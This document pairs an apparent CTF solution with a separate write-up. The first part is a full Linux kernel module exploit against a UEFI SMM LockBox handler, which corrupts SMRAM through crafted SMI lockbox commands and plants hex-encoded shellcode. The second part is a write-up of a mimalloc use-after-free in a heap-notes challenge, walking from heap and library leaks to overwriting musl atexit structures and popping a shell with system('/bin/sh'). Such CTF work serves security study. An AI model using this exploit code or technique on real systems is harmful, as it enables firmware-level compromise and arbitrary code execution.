// SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate;
#if 0
typedef struct {
  UINTN                   Signature;
 
  ///
  /// The ImageHandle passed into the entry point of the SMM IPL.  This ImageHandle
  /// is used by the SMM Core to fill in the ParentImageHandle field of the Loaded
  /// Image Protocol for each SMM Driver that is dispatched by the SMM Core.
  ///
  EFI_HANDLE              SmmIplImageHandle;
 
  ///
  /// The number of SMRAM ranges passed from the SMM IPL to the SMM Core.  The SMM
  /// Core uses these ranges of SMRAM to initialize the SMM Core memory manager.
  ///
  UINTN                   SmramRangeCount;
 
  ///
  /// A table of SMRAM ranges passed from the SMM IPL to the SMM Core.  The SMM
  /// Core uses these ranges of SMRAM to initialize the SMM Core memory manager.
  ///
  EFI_SMRAM_DESCRIPTOR    *SmramRanges;
 
  ///
  /// The SMM Foundation Entry Point.  The SMM Core fills in this field when the
  /// SMM Core is initialized.  The SMM IPL is responsible for registering this entry
  /// point with the SMM Configuration Protocol.  The SMM Configuration Protocol may
  /// not be available at the time the SMM IPL and SMM Core are started, so the SMM IPL
  /// sets up a protocol notification on the SMM Configuration Protocol and registers
  /// the SMM Foundation Entry Point as soon as the SMM Configuration Protocol is
  /// available.
  ///
  EFI_SMM_ENTRY_POINT      SmmEntryPoint;
 
  ///
  /// Boolean flag set to TRUE while an SMI is being processed by the SMM Core.
  ///
  BOOLEAN                  SmmEntryPointRegistered;
 
  ///
  /// Boolean flag set to TRUE while an SMI is being processed by the SMM Core.
  ///
  BOOLEAN                  InSmm;
 
  ///
  /// This field is set by the SMM Core then the SMM Core is initialized.  This field is
  /// used by the SMM Base 2 Protocol and SMM Communication Protocol implementations in
  /// the SMM IPL.
  ///
  EFI_SMM_SYSTEM_TABLE2    *Smst;
 
  ///
  /// This field is used by the SMM Communication Protocol to pass a buffer into
  /// a software SMI handler and for the software SMI handler to pass a buffer back to
  /// the caller of the SMM Communication Protocol.
  ///
  VOID                     *CommunicationBuffer;
 
  ///
  /// This field is used by the SMM Communication Protocol to pass the size of a buffer,
  /// in bytes, into a software SMI handler and for the software SMI handler to pass the
  /// size, in bytes, of a buffer back to the caller of the SMM Communication Protocol.
  ///
  UINTN                    BufferSize;
 
  ///
  /// This field is used by the SMM Communication Protocol to pass the return status from
  /// a software SMI handler back to the caller of the SMM Communication Protocol.
  ///
  EFI_STATUS               ReturnStatus;
 
  EFI_PHYSICAL_ADDRESS     PiSmmCoreImageBase;
  UINT64                   PiSmmCoreImageSize;
  EFI_PHYSICAL_ADDRESS     PiSmmCoreEntryPoint;
} SMM_CORE_PRIVATE_DATA;
#endif
 
#define SMMC_PHYS_ADDR 0xeacd160
#define COMMAND_BUFFER_PHYS_ADDR 0xeb68000
void *comm_virt = NULL, *payload_virt, *smmc = NULL;
void *reserved = NULL;
 
void trigger_smi(void);
void send_smi(void *data, uint64_t size);
void test_smi(void);
 
void save_lockbox(GUID guid, PHYSICAL_ADDRESS buffer, UINT64 length) {
    EFI_SMM_LOCK_BOX_PARAMETER_SAVE save = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_SAVE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_SAVE),
            .ReturnStatus = 0
        },
        .Buffer = buffer,
        .Length = length
    };
    memcpy(&save.Guid, &guid, sizeof(GUID));
    send_smi(&save, sizeof(save));
}
 
void set_lockbox_attributes(GUID guid, UINT64 attributes) {
    EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES set_attributes = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES),
            .ReturnStatus = 0
        },
        .Attributes = attributes
    };
    memcpy(&set_attributes.Guid, &guid, sizeof(GUID));
    send_smi(&set_attributes, sizeof(set_attributes));
}
 
void update_lockbox(GUID guid, UINT64 buffer, UINTN offset, UINTN length) {
    EFI_SMM_LOCK_BOX_PARAMETER_UPDATE update = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_UPDATE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_UPDATE),
            .ReturnStatus = 0
        },
        .Buffer = buffer,
        .Offset = offset,
        .Length = length
    };
    memcpy(&update.Guid, &guid, sizeof(GUID));
    send_smi(&update, sizeof(update));
}
 
void restore_lockbox(GUID guid, PHYSICAL_ADDRESS buffer, UINT64 length) {
    EFI_SMM_LOCK_BOX_PARAMETER_RESTORE restore = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_RESTORE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_RESTORE),
            .ReturnStatus = 0
        },
        .Buffer = buffer,
        .Length = length
    };
    memcpy(&restore.Guid, &guid, sizeof(GUID));
    send_smi(&restore, sizeof(restore));
}
 
void restore_all_lockbox_in_place(void) {
    EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE restore_all = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE),
            .ReturnStatus = 0
        }
    };
    send_smi(&restore_all, sizeof(restore_all));
}
 
static int __init pwn_init(void) {
    pr_info("[*] pwn: module loaded\n");
    reserved = ioremap(SMMC_PHYS_ADDR & (~0xfffull), 2 * PAGE_SIZE);
    if (!reserved) {
        pr_err("pwn: failed to ioremap reserved memory\n");
        return -ENOMEM;
    }
    smmc = reserved + (SMMC_PHYS_ADDR & 0xfff);
    comm_virt = ioremap(COMMAND_BUFFER_PHYS_ADDR & (~0xfffull), PAGE_SIZE);
    if (!comm_virt) {
        pr_err("[-] pwn: failed to ioremap command buffer\n");
        return -ENOMEM;
    }
    pr_info("[+] pwn: smmc at 0x%llx, comm_virt at 0x%llx\n", smmc, comm_virt);
#if 0
    test_smi();
#endif
    EFI_GUID guid;
    memset(&guid, 0x11, sizeof(EFI_GUID));
    pr_info("[*] create a lockbox\n");
    save_lockbox(guid, 0xf000000-1, 1);
    pr_info("[*] set lockbox attributes\n");
    set_lockbox_attributes(guid, LOCK_BOX_ATTRIBUTE_RESTORE_IN_S3_ONLY);
    void *buffer = comm_virt + 0x800;
    memset(buffer, 0x60, 0x400);
    *(uint64_t *)(buffer + 1) = 0x34365f33534d4d53;
    *(uint64_t *)(buffer + 0x1 + 0x8) = 0xffc7673;
    *(uint64_t *)(buffer + 0x1 + 0x10) = SMMC_PHYS_ADDR + 0x1000 - 0x8000;
    pr_info("[*] update lockbox\n");
    update_lockbox(guid, (UINT64)COMMAND_BUFFER_PHYS_ADDR+0x800, 0, 0x1 + 0x8 + 0x8 + 0x8);
    pr_info("[*] set attributes back to restore in place\n");
    set_lockbox_attributes(guid, 0);
    set_lockbox_attributes(guid, LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE);
    pr_info("[*] restore lockbox\n");
    restore_all_lockbox_in_place();
    {
        void *addr_ret_addr = reserved + 0x1000 - 0x28 + 0x160;
        *(uint64_t *)addr_ret_addr = 0x41414141;
    }
    {
        void *addr_ret_addr = reserved + 0x1000 - 0x28 + 0x168;
        *(uint64_t *)addr_ret_addr = 0x000000000eace150;
        uint64_t *code_start = (uint64_t *)(reserved + 0x1000 - 0x28 + 0x168 + 2 * 8);
        code_start[0]  = 0x0044440067b84850;
        code_start[1]  = 0x0025048948800000;
        code_start[2]  = 0x048b48b8480ff952;
        code_start[3]  = 0x0489484444000025;
        code_start[4]  = 0x48b8480ffdc74325;
        code_start[5]  = 0x4844440008251c8b;
        code_start[6]  = 0x480ffdc74b250489;
        code_start[7]  = 0x440010250c8b48b8;
        code_start[8]  = 0xfdc7532504894844;
        code_start[9]  = 0x1825148b48b8480f;
        code_start[10] = 0x5b25048948444400;
        code_start[11] = 0x048b4cb8480ffdc7;
        code_start[12] = 0x0489484444002025;
        code_start[13] = 0x4cb8480ffdc76325;
        code_start[14] = 0x4844440028250c8b;
        code_start[15] = 0x480ffdc76b250489;
        code_start[16] = 0x44003025148b4cb8;
        code_start[17] = 0xfdc7732504894844;
        code_start[18] = 0xfdc77b2504c7480f;
        code_start[19] = 0x04c65800000b0f0f;
        code_start[20] = 0xc748000ffe017825;
        code_start[21] = 0x00000eace1502504;
        code_start[22] = 0xc74818ec83480000;
        code_start[23] = 0x00c30ffc0a2a2404;
    }
    return 0;
}
 
void test_smi() {
    EFI_SMM_LOCK_BOX_PARAMETER_SAVE save = {
        .Header = {
            .Command = 0x41414141, // Example command
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_SAVE) - sizeof(EFI_SMM_LOCK_BOX_PARAMETER_HEADER),
            .ReturnStatus = 0
        },
        .Buffer = (PHYSICAL_ADDRESS)comm_virt,
        .Length = 0xdeadbeef // Example length
    };
    send_smi(&save, sizeof(save));
    pr_info("[*] pwn: SMI triggered with test data\n");
}
 
void send_smi(void *data, uint64_t size) {
    void *comm = smmc + 56;
    void *comm_size = smmc + 64;
    uint64_t total_size = size + sizeof(EFI_GUID) + sizeof(UINTN);
 
    memcpy(comm_virt, &gEfiSmmLockBoxCommunicationGuid, sizeof(EFI_GUID));
    memcpy(comm_virt + sizeof(EFI_GUID), &size, sizeof(UINTN));
    memcpy(comm_virt + sizeof(EFI_GUID) + sizeof(UINTN), data, size);
    writeq(COMMAND_BUFFER_PHYS_ADDR, comm);
    writeq(total_size, comm_size);
    trigger_smi();
}
 
static void __exit pwn_exit(void) {
    pr_info("pwn: module unloaded\n");
    // trigger SMI again
    EFI_GUID guid;
    memset(&guid, 0x22, sizeof(EFI_GUID));
    save_lockbox(guid, 0, 1);
}
 
void trigger_smi(void) {
    asm volatile(
        ".intel_syntax noprefix;"
        "xor eax, eax;"
        "out 0xb3, eax;"
        "out 0xb2, eax;"
        ".att_syntax;" ::: "rax");
}
module_init(pwn_init);
module_exit(pwn_exit);
 

The flag will be read into rax, rbx, rcx, rdx, r8, r9, r10 and can be retrieved from the crash log.


------

do re mi
The musl allocator was too slow, so we went to a company known for ðŸš€ Blazing Fast ðŸš€ software, Microsoft!
 - Surg
setup
This challenge was built using musl and uses a preloaded allocator called mimalloc, which is an allocator maintained by Microsoft that is compatible with libc. From the docker file we can see that it is version 2.2.4. The source code for this version is available on GitHub.

The challenge is a heap-notes style program, which means we can create, delete, look at, and update objects on the heap. All created notes are 128 bytes large. Looking and updating are done through the read and write functions which aren't vulnerable to buffer overwrites (they take in a size parameter, in this case 127). Looking closer, it becomes obvious there is a use-after-free: the delete function does nothing to stop other functions from using the note.

void delete() {
   unsigned int number = get_index();
   free(notes[number]); // No clean up done here
   printf("Done!\n");
   return; 
}

void update() {
    unsigned int number = get_index();
    printf("Content? (127 max): ");
    read(STDIN_FILENO, notes[number], NOTE_SIZE-1); // No check for freed block here
    printf("Done!\n");
    return;
}
Thus, we can write to the internal values of blocks in the freelist if the mimalloc allocator stores information in freed memory (hint: it does). The rest of this writeup will look at how the mimalloc allocator works, how to exploit it to get arbitrary read and write, and then finally how to pop a shell.

running the chal
How do we set this up locally? After some futzing, what I did was:

Create an alpine container (the latest was created 11 days ago, so it should have the same musl version) and download the libc.musl stored in the container.
Use the LD_PRELOAD and LD_LIBRARY_PATH environment variables, as well as the musl ld (ld-musl-x86_64.so.1), to run the binary locally
Convert this into a format that gdb understands using the --args option and the env command (which allows setting environment variables per run) the final command looked like this:
gdb chal --args env LD_PRELOAD=./libmimalloc.so.2.2 LD_LIBRARY_PATH=$PWD ./ld-musl-x86_64.so.1 ./chal
If you install musl and use that instead of the container's library you can get symbols (including some musl and mimalloc symbols). When I moved to using the containers library, I could get symbols by breaking after it starts and then loading the file (file chal) and using vmmap to get the base offset of said symbols (in pwndbg).

the mimalloc allocator
The idea
The mimalloc source code is very messy (due to things like debug statements, ifdef sections, and similar), so the first thing we want to do is test it locally to see what it does. Running it in GDB, i did this:

Create blocks in indexes 0 and 1, in that order
Delete blocks 0 and 1, in that order Doing this, and printing out notes to find where these blocks go, we get the following output (formatted as an array of longs):
note 0:
0x4cd9e010080:  0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000...
note 1:
0x4cd9e010100:  0x000004cd9e010080      0x0000000000000000
                0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000...
It lookes like the first long of note 1 points to note 0, which was freed first. It seems like the freelist appends to the front, so note 1 should be at the top of the list and we can write an address to note 1, make a note (putting what is in note 1 to the top) and make another note (putting the address we put into note 1 into the notes array). If this works, we will get arbitrary read and write at the address we put in note 1. What should our target be? Well, (I guessed with no real reason), the start of the mapped space probably has something from libmimalloc, so lets look there:

beginning of the heap's page
0x4cd9e000000:  0x0000000000000000      0x0000000000000001
                0x0000000600010100      0x0000000000000101
                0x0000000002000000      0x00007ffff7f49d40
                0x0000000000000000      0x0000000000000000
                0x0000000000000000      0x0000000000000000
Looking at this (installing musl with apt because it gave better symbols), we find that the library pointer looking value (0x00007ffff7f49d40) is mi_subproc_default from libmalloc. This allows us to find the base of libmalloc in memory.

The problem
If you try to exploit this in its current form, it won't work. Lets say you try this exploit:

Create blocks 0 and 1, then delete blocks 0 and 1.
Write 0x4cd9e000000, create 2 blocks (block 2 and block 3)
Read block 3 You will notice that our leak is nowhere to be found. What is actually allocated is 0x4cd9e010180, which is 128 bytes after note 1. Not only this, 0x4cd9e010200 is the value stored in note 3 insteadâ€¦
free vs local_free
There are 2 structures that go into allocating a block for mimalloc: mi_heap_t and mi_page_t. Of these, mi_page_t is the one with the free list, called free. It also has another linked list called local_free, which we will talk about later:

struct mi_heap_s {
    ... // Unimportant for us
    mi_page_t*            pages_free_direct[MI_PAGES_DIRECT];.
    mi_page_queue_t       pages[MI_BIN_FULL + 1];              // queue of pages for each size class (or "bin")
};

typedef struct mi_page_queue_s {
    mi_page_t* first;
    mi_page_t* last;
    size_t     block_size;
} mi_page_queue_t;

typedef struct mi_page_s {
    ...
    mi_block_t*           free;              // list of available free blocks (`malloc` allocates from this list)
    mi_block_t*           local_free;        // list of deferred free blocks by this thread (migrates to `free`)
    ...
} mi_page_t;
Just looking at local_free's comment (which I did not do until it was too late) should give you an idea of what will happen.

Looking into mallocs definition in mimalloc, we are sent to the function _mi_page_malloc_zero, which uses page->free as the new chunk if its available and otherwise calls _mi_malloc_generic. I'm going to gloss over what I actually did to find this due to it being confusing and somewhat boring, but for a gist of the struggles it boiled down to flaky symbols with my GDB setup and mimalloc being heavily optimized (functions seemingly being rearranged by the compiler with jumps) making it confusing to find what function I was in. But, after some toying, this is what I found.

As stated before, the newly allocated note 3 (from the previous section) points to 0x4cd9e010200. If you were to look at the memory at that location, you would find it points to 0x4cd9e010280, another 128 bytes after. You can continue following this chain until you reach 0x4cd9e010f80, which will point to NULL. This looks like a linked list. This creates a hypothesis: local_free is where note 1 and note 0 live, and free is where all of these chunks which are allocated live.

Looking further into mimalloc for where local_free is used, this seems to be the case:

void _mi_page_free_collect(mi_page_t* page, bool force) {
    ...
    if mi_likely(page->free == NULL) {
        // usual case
        page->free = page->local_free;
        page->local_free = NULL;
        page->free_is_zero = false;
    }
    ...
}
Looking in _mi_malloc_generic for where this is called, we find the function mi_find_page calls the function mi_find_free_page, which calls _mi_page_free_collect if the page already exists. This happens every allocation, so there's nothing we need to do to cause it beside getting page->free == NULL to be true.

From the fact the chunk 0x4cd9e010f80 points to null, we can deduce that page->free == NULL will be true after 0x1000 / 0x80 = 32 allocations, therefore we can get this sequence to leak libmimalloc:

Create note 0 and 1, then delete note 0 and 1
Read note 1 to get a heap leak, bitwise-AND this with 0xFFFFF to get our heap page base
Write our heap page base to note 1
Create 32 notes total, so 30 more notes after the 2 we originally created
At this point, local_free will be moved to free, and note 1 will be the head of the free list
Allocate 2 chunks, note 2 and note 3. Note 2 will point to note 1, and note 3 will point to our heap page base
Read note 3 and get our libmimalloc leak
We run this, and it succeeds!

[+] Opening connection to doremi.chal.uiuc.tf on port 1337: Done
# Creating and freeing chunks...
# Getting heap leak...
# Writing target address...
# Setting free to local_free...
# Creating target notes...
# Reading chunk 3 (mimalloc leak note)...
00000000000000000100000000000000000101000600000001010000000000000000000200000000403dc29f367f
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000ffffffffffffff
'mi_subproc_default`: 0x7f369fc23d40
libmimalloc base: 0x7f369fbf5000
The exploit
Getting to musl and finding a target
After all this, all we have is leak to mimalloc, which doesn't have any obvious virtual tables or other targets. If we an find musl's offset, then we have a better chance of finding something exploitable. How do we find musl> As with a lot of the rest of this challenge, testing, guessing, and checking will help. First, in pwndbg, we can use vmmap to check if libmimalloc is at a constant offset to libc.musl. You can disable ASLR by using set disable-randomization off. You will find that it is a constant offset. In GDB this was 0x33000. For some reason, running it outside of GDB and using proc/<pid>/maps gave a different offset, but if we check it on remote and it gives us the expected value (say, a stack location) then we know which one is correct. Running it with offset 0x33000:

# Reading environ...
c8e28719ff7f00006900bf6ded0433dd000000000000000000000000000000000000000000000000000000000000
00000000000000000000afff8719ff7f0000baff8719ff7f0000fffb8b1700000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000
0x7fff1987e2c8 looks like a stack address (which we expect environ to be, and for most other things to not be). So, on remote 0x33000 is the correct offset.

Now we need a target. As me using environ as a leak target may suggest, I was originally planning on using environ and then creating a ROP chain to get a shell. However, the way you do this is by doing the ROP on the update functions stack frame (which I forgot you could do somehow LOL). At the time, I was thinking you were blocked from doing this as main never returned, but instead used exit. I did not think about this further, because I decided to exploit exit handlers instead.

Looking through some previous CTF writeups, the struct that governs the atexit functionallity of musl is struct fl in the file atexit.c. Its quite simple:

static struct fl
{
    struct fl *next;
    void (*f[COUNT])(void *);
    void *a[COUNT];
} builtin, *head;
To understand it fully, lets look at what is called when the program exits (abridged without LOCk and UNLOCK noise):

static int slot;

...

void __funcs_on_exit()
{
    void (*func)(void *), *arg;
    for (; head; head=head->next, slot=COUNT) while(slot-->0) {
        func = head->f[slot];
        arg = head->a[slot];
        func(arg);
    }
}
If slot is greater than zero, it wil go through f and a, paring each function with its arguement. If we can overwrite the first func and the first arg, and also overwrite slot to 1, then we can call system("/bin/sh"). The only annoying problem is that struct fl is 520 bytes long and bigger than a single chunk, but this can be solved by making multiple chunks in a row (remember, each chunk is ox80 large and 0x80 apart from each other, so they are contiguous without any meta-data).

Final exploit
Here is the general outline:

Create 5 fake chunks. The last chunk, chunk 4, will have /bin/sh in it and will be put into the a array in the struct fl. Chunks 1 through 3 will be used as a fake struct fl and will be filled with a pointer to system and a pointer to chunk 4. Chunk 0 will contain the address for chunk one, and chunk 3 will contain the address for chunk 4.
Write the values above into the chunks. /bin/sh is written to chunk 4, system is written to chunk 1, and chunk 4's address is written to chunk 3.
Create note 7 which overlaps with the head global variable in atexit.c (this can be found by disassembling the __funcs_on_exit function in GDB), using the exploit we used to gain a libmimalloc leak
Note: We want to target head - 24. This is because we want free to be empty after our note is created, otherwise we won't be able to allocate again. head - 24 is the first 8 bytes which are all 0x00 and won't cause a crash
Again using the previous exploit, create note 8 which overlaps with the slots variable
Write 0x1 to slots and the address of chunk 1 to head
Call exit by sending an invalid index
Using this, we properly pop a shell and can get the flag:

# Overwriting head and slots...
[*] Switching to interactive mode
$ a
Invalid Input.
$ ls
chal
flag
libmimalloc.so.2.2
The solve script is a little too long for this write up, but its hosted on Github Gists: solve.py